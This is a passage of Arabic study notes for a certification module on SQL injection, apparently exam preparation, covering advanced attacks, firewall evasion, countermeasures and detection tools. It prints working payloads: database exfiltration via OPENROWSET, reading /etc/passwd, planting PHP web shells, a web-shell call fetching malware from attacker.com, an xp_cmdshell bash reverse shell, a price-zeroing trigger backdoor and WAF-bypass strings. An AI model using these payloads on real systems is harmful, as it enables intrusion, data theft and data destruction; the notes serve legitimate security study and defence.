+<p>المهاجم يربط سيرفر SQL المستهدَف بجهازه عبر <code>OPENROWSET</code> ثم ينقل البيانات على <strong>Port 80</strong>.</p>
+<div class="code-wrap"><span class="code-tag">sql — database transfer via openrowset</span><pre><code>'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
+  'select * from mydatabase..hacked_sysdatabases') select * from sys.sysdatabases--
+'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
+  'select * from mydatabase..table1') select * from database..table1--</code></pre></div>
+
+
+<h3>التفاعل مع نظام التشغيل (OS Interaction)</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الطريقة</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>قراءة وكتابة ملفات النظام</td><td>LOAD_FILE() وINTO OUTFILE() في MySQL</td></tr>
+<tr><td>تنفيذ مباشر عبر Remote Shell</td><td>xp_cmdshell في MSSQL أو PHP Shell عبر MySQL</td></tr>
+</tbody>
+</table></div>
+
+<div class="code-wrap"><span class="code-tag">sql — mysql file system interaction</span><pre><code>-- قراءة ملف /etc/passwd
+NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*
+
+-- كتابة PHP Shell على السيرفر
+NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>'
+INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
+
+-- بعد كتابة الـ Shell:
+http://www.certifiedhacker.com/shell.php?command=wget http://attacker.com/malware</code></pre></div>
+
+
+<h3>إنشاء OS Shell باستخدام MySQL وMSSQL</h3>
+<div class="code-wrap"><span class="code-tag">sql — create os shell</span><pre><code>-- MySQL: كتابة PHP Shell
+SELECT '<?php exec($_GET["cmd"]); ?>' FROM usertable
+INTO dumpfile '/var/www/html/shell.php'
+
+-- معرفة مسار الـ Web Server
+SELECT @@datadir;
+
+-- MSSQL: xp_cmdshell لإنشاء Reverse Shell على Port 8080
+EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'</code></pre></div>
+
+
+<h3>إنشاء Database Backdoor عبر Trigger</h3>
+<div class="code-wrap"><span class="code-tag">sql — malicious trigger backdoor</span><pre><code>-- مثال: Trigger يضبط سعر كل منتج على 0 تلقائيًا
+CREATE OR REPLACE TRIGGER SET_PRICE
+AFTER INSERT OR UPDATE ON ITEMS
+FOR EACH ROW BEGIN
+    UPDATE ITEMS SET Price = 0;
+END;</code></pre></div>
+
+<div class="callout danger"><div class="callout-label">خطورة Database Backdoor</div><p>الـ Trigger ينفّذ تلقائيًا عند كل INSERT أو UPDATE على الجدول — المهاجم يستطيع التحكّم في البيانات بشكل مستمرّ حتى بعد اكتشاف الاختراق وإزالة الـ Payload الأولي.</p></div>
+
+
+<h3>DNS Exfiltration عبر SQL Injection</h3>
+<p>المهاجم يستخدم استعلامات DNS لاستخراج البيانات (مثل Password Hashes). طلبات DNS من السيرفر يمكنها عبور جدار الحماية عبر سيرفر DNS داخلي حتى لو كان الـ Firewall يمنع الإرسال المباشر للإنترنت.</p>
+
+<h3>MongoDB / NoSQL Injection</h3>
+<p>MongoDB يستخدم قاعدة بيانات NoSQL معرَّضة لهجمات NoSQL Injection. التطبيقات التي تستخدمها (PHP وJavaScript وPython وJava) قد تحتوي هذه الثغرة في كود المصادقة — تُتيح تجاوز Authentication وسرقة البيانات وتعديلها. مثال: تطبيق PHP يسمح بعملية <code>$where</code> في MongoDB — المهاجم يحقن كود JavaScript خبيث يعرض قائمة المستخدمين.</p>
+
+<h3>أدوات SQL Injection</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>sqlmap</td><td>أداة Penetration Testing مفتوحة المصدر تُؤتِّم الكشف عن ثغرات SQL Injection واستغلالها والاستيلاء على سيرفرات قواعد البيانات (sqlmap.org)</td></tr>
+<tr><td>Mole</td><td>أداة استغلال SQL Injection تلقائية — تحتاج فقط URL ضعيف وسلسلة صالحة على الموقع لتكتشف الحقن وتستغله بـ Union أو Boolean Query</td></tr>
+<tr><td>jSQLInjection</td><td>GitHub</td></tr>
+<tr><td>NoSQLMap</td><td>GitHub — لـ NoSQL</td></tr>
+<tr><td>Havij</td><td>GitHub</td></tr>
+<tr><td>blind_sql_bitshifting</td><td>GitHub — Blind SQL Injection متخصَّص</td></tr>
+</tbody>
+</table></div>
+
+
+<!-- LU5 -->
+
+<hr />
+
+<h2 id="lu5"><span class="num">05</span><span class="htext">تقنيات تجاوز الـ Firewall والـ IDS</span></h2>
+
+
+
+<h3>أنواع تقنيات تجاوز التوقيعات (Signature Evasion)</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الشرح</th><th>مثال</th></tr></thead>
+<tbody>
+<tr><td>In-line Comments</td><td>إدراج تعليقات بين كلمات SQL المفتاحية لإخفاء النمط</td><td><code>UN/**/ION SEL/**/ECT</code></td></tr>
+<tr><td>Char Encoding</td><td>استخدام دالة CHAR() لتمثيل الأحرف بدون علامات الاقتباس</td><td><code>char(47,101,116,99)</code> = /etc</td></tr>
+<tr><td>String Concatenation</td><td>تقسيم الكلمة المفتاحية وتجميعها بإرشادات خاصة بالـ DB</td><td>DB-specific concat operators</td></tr>
+<tr><td>Obfuscated Code</td><td>جعل جملة SQL صعبة الفهم</td><td>تشابك الكلمات المفتاحية</td></tr>
+<tr><td>Manipulating White Spaces</td><td>إدراج مسافات زائدة أو بديلة بين الكلمات المفتاحية</td><td><code>UNION%09SELECT</code> (Tab)</td></tr>
+<tr><td>Hex Encoding</td><td>تمثيل الاستعلام بترميز Hex</td><td><code>0x4F52</code> = OR</td></tr>
+<tr><td>Sophisticated Matches</td><td>بديل لـ <code>OR 1=1</code></td><td><code>OR 'a'='a'</code>، <code>OR 1 LIKE 1</code></td></tr>
+<tr><td>URL Encoding</td><td>إضافة <code>%</code> قبل كل Code Point</td><td><code>%55NION</code> = UNION</td></tr>
+<tr><td>Null Byte</td><td>استخدام <code>%00</code> قبل النص لتجاوز آلية الكشف</td><td><code>%00 UNION SELECT</code></td></tr>
+<tr><td>Case Variation</td><td>خلط الأحرف الكبيرة والصغيرة</td><td><code>uNiOn SeLeCt</code></td></tr>
+<tr><td>Declare Variables</td><td>تخزين جمل SQL في متغيّرات وتمريرها</td><td><code>DECLARE @v varchar(100); SET @v='UNION...'</code></td></tr>
+<tr><td>IP Fragmentation</td><td>تقسيم الحزمة لشظايا تحمل الـ Payload دون أن يكشفها توقيع الـ IDS</td><td>Tiny Fragments</td></tr>
+<tr><td>Variations</td><td>جملة WHERE دائمًا TRUE</td><td><code>WHERE 1 BETWEEN 0 AND 2</code></td></tr>
+</tbody>
+</table></div>
+
+
+<h3>تقنيات Bypass الـ Firewall</h3>
+<div class="code-wrap"><span class="code-tag">http — firewall bypass techniques</span><pre><code>-- Normalization Method
+/?id=1/*union*/union/*select*/select+1,2,3/*
+
+-- HPP Technique (HTTP Parameter Pollution)
+/?id=1;select+1&id=2,3+from+users+where+id=1--
+
+-- HPF Technique (مع UNION)
+/?a=1+union/*&b=*/select+1,2
+/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
+
+-- Blind SQL (بدائل OR/AND)
+/?id=1+OR+0x50=0x50
+/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
+
+-- Signature Bypass
+/?id=1+union+(select+'xz'from+xxx)
+/?id=(1)union(select(1),mid(hash,1,32)from(users))
+
+-- Buffer Overflow Method (C/C++ firewalls)
+?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4...
+
+-- CRLF Technique
+http://www.certifiedhacker.com/info.php?id=1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5--</code></pre></div>
+
+
+<h3>Char Encoding — أمثلة تطبيقية</h3>
+<div class="code-wrap"><span class="code-tag">sql — char encoding examples</span><pre><code>-- تحميل ملف بدون علامات اقتباس (string = "/etc/passwd")
+' union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+
+-- حقن بدون علامات اقتباس (string = "%")
+' or username like char(37);
+
+-- حقن بدون علامات اقتباس (string = "root")
+' union select * from users where login = char(114,111,111,116);
+
+-- فحص وجود ملف (string = "n.ext")
+' and 1=(if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));</code></pre></div>
+
+
+<!-- LU6 -->
+
+<hr />
+
+<h2 id="lu6"><span class="num">06</span><span class="htext">الإجراءات المضادة</span></h2>
+
+
+
+<h3>أفضل ممارسات منع SQL Injection</h3>
+<ol>
+<li>لا تفترض أي شيء عن حجم أو نوع أو محتوى البيانات المُستلَمة — دائمًا تحقّق</li>
+<li>اختبر حجم ونوع الإدخال وفرض حدودًا مناسبة لمنع Buffer Overflows</li>
+<li>اختبر محتوى متغيّرات النصوص واقبل فقط القيم المتوقَّعة</li>
+<li>ارفض الإدخالات التي تحتوي بيانات ثنائية أو Escape Sequences أو محارف التعليقات</li>
+<li>لا تبنِ جمل Transact-SQL مباشرةً من إدخال المستخدم — استخدم Stored Procedures للتحقّق</li>
+<li>طبِّق طبقات متعددة من التحقّق ولا تدمج إدخال المستخدم غير المتحقَّق منه</li>
+<li>تجنّب بناء SQL ديناميكي بقيم مُدخَلة متسلسلة (String Concatenation)</li>
+<li>استخدم أنواع حسابات SQL الأكثر تقييدًا للتطبيقات (Least Privilege)</li>
+<li>تأكّد إن ملفات Web Config لا تحتوي معلومات حسّاسة</li>
+<li>نفِّذ اختبار Black Box Injection الآلي وتحليل الكود الثابت والاختبار اليدوي</li>
+<li>احتفِظ بالبيانات غير الموثوقة منفصلة عن الأوامر والاستعلامات</li>
+<li>في غياب Parameterized API استخدم Escape Syntax خاصة بالمفسِّر لإزالة الأحرف الخاصة</li>
+<li>استخدم خوارزمية Hash آمنة مثل <strong>SHA256</strong> لتخزين كلمات مرور المستخدمين (لا تخزّن Plaintext)</li>
+<li>استخدم Data Access Abstraction Layer لتطبيق وصول آمن للبيانات في كل التطبيق</li>
+<li>صمِّم الكود بحيث يلتقط ويعالج الاستثناءات بشكل مناسب</li>
+<li>أزِل رسائل Code Tracing وDebug قبل نشر التطبيق</li>
+<li>طبِّق قواعد Least Privilege لتشغيل التطبيقات التي تصل لـ DBMS</li>
+<li>احذف الحسابات الافتراضية من قاعدة بيانات SQL</li>
+<li>استخدم ORM Frameworks مثل Hibernate وSpring Data JPA — توفّر آليات مدمَجة لبناء وتنفيذ استعلامات SQL بأمان مع Parameterization تلقائي</li>
+</ol>
+
+<h3>أدوات كشف SQL Injection</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>الرابط</th></tr></thead>
+<tbody>
+<tr><td>Ghauri</td><td>github.com</td></tr>
+<tr><td>Burp Suite</td><td>portswigger.net</td></tr>
+<tr><td>HCL AppScan</td><td>hcl-software.com</td></tr>
+<tr><td>Invicti</td><td>invicti.com</td></tr>
+<tr><td>sqlmap</td><td>sqlmap.org</td></tr>
+<tr><td>Arachni</td><td>ecsypno.com</td></tr>
+<tr><td>Qualys WAS</td><td>qualys.com</td></tr>
+<tr><td>Fortify WebInspect</td><td>microfocus.com</td></tr>
+<tr><td>BeSECURE</td><td>beyondsecurity.com</td></tr>
+<tr><td>sqlifinder</td><td>github.com</td></tr>
+<tr><td>Wapiti</td><td>wapiti-scanner.github.io</td></tr>
+<tr><td>InsightAppSec</td><td>rapid7.com</td></tr>
+<tr><td>Acunetix</td><td>acunetix.com</td></tr>
+<tr><td>Detectify</td><td>detectify.com</td></tr>
+<tr><td>SonarQube</td><td>sonarsource.com</td></tr>
+<tr><td>Veracode</td><td>veracode.com</td></tr>
+<tr><td>PVS-Studio</td><td>pvs-studio.com</td></tr>
+<tr><td>Coverity Scan</td><td>scan.coverity.com</td></tr>
+</tbody>
+</table></div>
+
+
+<!-- CHEAT -->
+
+<hr />
+
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+
+
+<div class="cheat-section">
+
+<h4>مقارنة أنواع SQL Injection</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>قناة النتائج</th><th>السرعة</th><th>يحتاج Error Messages؟</th><th>مثال</th></tr></thead>
+<tbody>
+<tr><td>In-band (Error-based)</td><td>نفس القناة</td><td>سريع</td><td>نعم</td><td>ORA-29257، MySQL Errors</td></tr>
+<tr><td>In-band (UNION)</td><td>نفس القناة</td><td>سريع</td><td>لا (يحتاج عدد الأعمدة)</td><td>UNION SELECT creditCardNumber</td></tr>
+<tr><td>Blind Boolean</td><td>نفس القناة (True/False)</td><td>بطيء</td><td>لا</td><td>AND 1=1 مقابل AND 1=2</td></tr>
+<tr><td>Blind Time-based</td><td>نفس القناة (تأخير)</td><td>بطيء جدًا</td><td>لا</td><td>WAITFOR DELAY</td></tr>
+<tr><td>Double-Blind</td><td>مؤشّرات غير مباشرة</td><td>بطيء جدًا</td><td>لا</td><td>سلوك التطبيق وأوقات الاستجابة</td></tr>
+<tr><td>Out-of-Band</td><td>قناة مختلفة (DNS/HTTP)</td><td>متغيّر</td><td>لا</td><td>UTL_HTTP.request</td></tr>
+<tr><td>Second-Order</td><td>مؤجَّل — يُنفَّذ بطلب لاحق</td><td>مختلف</td><td>لا</td><td>بيانات مخزَّنة تُنفَّذ لاحقًا</td></tr>
+</tbody>
+</table></div>
+
+
+<h4>تقنيات In-band — مقارنة سريعة</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الفكرة الجوهرية</th></tr></thead>
+<tbody>
+<tr><td>Tautology</td><td>WHERE دائمًا TRUE — <code>OR 1=1</code></td></tr>
+<tr><td>End-of-Line Comment</td><td><code>--</code> يُلغي باقي الاستعلام</td></tr>
+<tr><td>In-line Comments</td><td><code>/* */</code> لتجاوز الـ Blacklisting</td></tr>
+<tr><td>Piggybacked Query</td><td><code>;</code> لإضافة استعلام ثانٍ</td></tr>
+<tr><td>System Stored Procedure</td><td><code>xp_cmdshell</code> لتنفيذ أوامر OS</td></tr>
+<tr><td>Union Injection</td><td>UNION لضمّ نتائج جدول آخر</td></tr>
+<tr><td>Error-based</td><td>UTL_INADDR/UTL_HTTP لاستخراج بيانات في رسائل الخطأ</td></tr>
+</tbody>
+</table></div>
+
+
+<h4>تسلسل Advanced SQL Injection</h4>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">تعداد قواعد البيانات والجداول</div><div class="step-body"><p>sys.databases، sysobjects، information_schema.columns</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">سرقة كلمات المرور والـ Hashes</div><div class="step-body"><p>SELECT FROM sys.syslogins — حقن في جدول Users</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">نقل قاعدة البيانات</div><div class="step-body"><p>OPENROWSET على Port 80</p></div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">التفاعل مع نظام الملفات</div><div class="step-body"><p>LOAD_FILE() ، INTO OUTFILE() في MySQL</p></div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">إنشاء OS Shell</div><div class="step-body"><p>PHP Shell + xp_cmdshell / bash Reverse Shell</p></div></div>
+<div class="step-item"><div class="step-num">6</div><div class="step-title">إنشاء Database Backdoor</div><div class="step-body"><p>CREATE TRIGGER يُعدِّل البيانات تلقائيًا</p></div></div>
+<div class="step-item"><div class="step-num">7</div><div class="step-title">DNS Exfiltration</div><div class="step-body"><p>استخراج Hashes عبر طلبات DNS</p></div></div>
+</div>
+
+
+</div>
+
+<!-- SUMMARY -->
+
+<hr />
+
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+
+
+<p>الموديول ناقش مفاهيم SQL Injection وأسبابه، وأنواعه الثلاثة الرئيسية (In-band وBlind وOut-of-Band) مع أنواعها الفرعية، ومنهجية الهجوم الكاملة (جمع المعلومات، اكتشاف الثغرات، تنفيذ Union وBlind وOut-of-Band)، والـ Advanced SQL Injection (تعداد قاعدة البيانات ونقلها والتفاعل مع OS وإنشاء Backdoors وDNS Exfiltration وNoSQL Injection)، ثم تقنيات تجاوز الـ WAF والإجراءات المضادة والأدوات.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module15_summary.txt</div>
+<ul>
+<li>SQL Injection ثغرة في التطبيق لا في قاعدة البيانات — السبب الجوهري هو عدم التحقّق من الإدخال قبل تمريره لجملة SQL</li>
+<li>In-band = نتائج في نفس القناة (الأسرع)، Blind = نتائج True/False أو تأخير زمني (الأبطأ)، Out-of-Band = قناة مختلفة (DNS أو HTTP)</li>
+<li>Tautology (OR 1=1) لتجاوز المصادقة — Piggybacked Query (;) لتنفيذ استعلام إضافي — End-of-Line Comment (--) لإلغاء بقية الاستعلام</li>
+<li>Time-based Blind يكشف البيانات حرفًا بحرف عبر WAITFOR DELAY — يتطلّب وقتًا طويلًا لكنه ينجح حتى مع أكثر التطبيقات صمتًا</li>
+<li>Advanced SQL Injection يتجاوز قاعدة البيانات للـ OS: LOAD_FILE/OUTFILE في MySQL وxp_cmdshell في MSSQL</li>
+<li>الدفاع الأساسي: Parameterized Queries (Prepared Statements)، Stored Procedures، ORM Frameworks، والتحقّق الصارم من الإدخال في كل طبقة</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>SQL Injection ليس مجرّد سرقة بيانات — هو في أسوأ أحواله مفتاح لنظام التشغيل كله.</strong> من <code>UNION SELECT</code> للحصول على الأعمدة، لـ <code>INTO OUTFILE</code> لزرع PHP Shell، لـ <code>xp_cmdshell</code> لتشغيل أوامر OS، لـ Reverse Shell للسيطرة الكاملة — كل هذا يبدأ من مدخل واحد غير مُتحقَّق منه.</p>
+</blockquote>
+
+<div class="callout examtip"><div class="callout-label">Exam Tip</div><p>أسئلة هذا الموديول تُركِّز على: الفرق بين In-band وBlind وOut-of-Band، الفرق بين Boolean وTime-based Blind SQL Injection، الفرق بين Piggybacked Query وTautology وEnd-of-Line Comment، آلية Second-Order SQL Injection، كيف تستخدم LOAD_FILE() وINTO OUTFILE() وxp_cmdshell، وتقنيات تجاوز WAF (Char Encoding وIn-line Comments وNull Byte).</p></div>
+
+
+<hr />
+<p><em>نهاية نوتس الموديول الخامس عشر — SQL Injection</em></p>
+<div class="footer-note">-- EOF: module-15/sql-injection.md --</div>
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
